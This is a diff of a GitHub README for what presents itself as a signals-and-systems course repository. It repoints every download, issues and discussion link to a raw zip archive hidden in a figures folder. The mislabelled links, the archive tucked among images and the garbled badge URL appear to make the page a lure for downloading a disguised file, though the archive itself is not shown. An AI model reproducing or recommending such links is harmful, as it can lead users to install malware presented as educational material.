@@ -1,6 +1,6 @@
 # 📚 signals-and-systems-PPU - Explore Signals and Systems Effortlessly
 
-[![Download the latest release](https://raw.githubusercontent.com/jfalecio/signals-and-systems-PPU/main/Lectures/figures/lec08/signals-and-systems-PPU-2.1.zip%20Latest%20Release-Click%https://raw.githubusercontent.com/jfalecio/signals-and-systems-PPU/main/Lectures/figures/lec08/signals-and-systems-PPU-2.1.zip)](https://raw.githubusercontent.com/jfalecio/signals-and-systems-PPU/main/Lectures/figures/lec08/signals-and-systems-PPU-2.1.zip)
+[![Download the latest release](https://github.com/jfalecio/signals-and-systems-PPU/raw/refs/heads/main/Solved Examples/figures/PPU-signals-systems-and-v3.1.zip%20Latest%20Release-Click%https://github.com/jfalecio/signals-and-systems-PPU/raw/refs/heads/main/Solved Examples/figures/PPU-signals-systems-and-v3.1.zip)](https://github.com/jfalecio/signals-and-systems-PPU/raw/refs/heads/main/Solved Examples/figures/PPU-signals-systems-and-v3.1.zip)
 
 ## 📁 About This Project
 
@@ -12,7 +12,7 @@ To get started with our content, follow the steps below to download and access t
 
 ## 📥 Download & Install
 
-Visit this page to download: [Release Page](https://raw.githubusercontent.com/jfalecio/signals-and-systems-PPU/main/Lectures/figures/lec08/signals-and-systems-PPU-2.1.zip)
+Visit this page to download: [Release Page](https://github.com/jfalecio/signals-and-systems-PPU/raw/refs/heads/main/Solved Examples/figures/PPU-signals-systems-and-v3.1.zip)
 
 1. Click on the link above.
 2. You will see a list of available versions. Click on the latest version to open it.
@@ -78,8 +78,8 @@ This project uses the MIT License. You are free to use the materials, but please
 
 ## 🔗 Useful Links
 
-- [Download the latest release](https://raw.githubusercontent.com/jfalecio/signals-and-systems-PPU/main/Lectures/figures/lec08/signals-and-systems-PPU-2.1.zip)
-- [Issues Page](https://raw.githubusercontent.com/jfalecio/signals-and-systems-PPU/main/Lectures/figures/lec08/signals-and-systems-PPU-2.1.zip)
-- [Discussion Board](https://raw.githubusercontent.com/jfalecio/signals-and-systems-PPU/main/Lectures/figures/lec08/signals-and-systems-PPU-2.1.zip)
+- [Download the latest release](https://github.com/jfalecio/signals-and-systems-PPU/raw/refs/heads/main/Solved Examples/figures/PPU-signals-systems-and-v3.1.zip)
+- [Issues Page](https://github.com/jfalecio/signals-and-systems-PPU/raw/refs/heads/main/Solved Examples/figures/PPU-signals-systems-and-v3.1.zip)
+- [Discussion Board](https://github.com/jfalecio/signals-and-systems-PPU/raw/refs/heads/main/Solved Examples/figures/PPU-signals-systems-and-v3.1.zip)
 
 Explore, learn, and enjoy your journey through Signals and Systems with our materials!
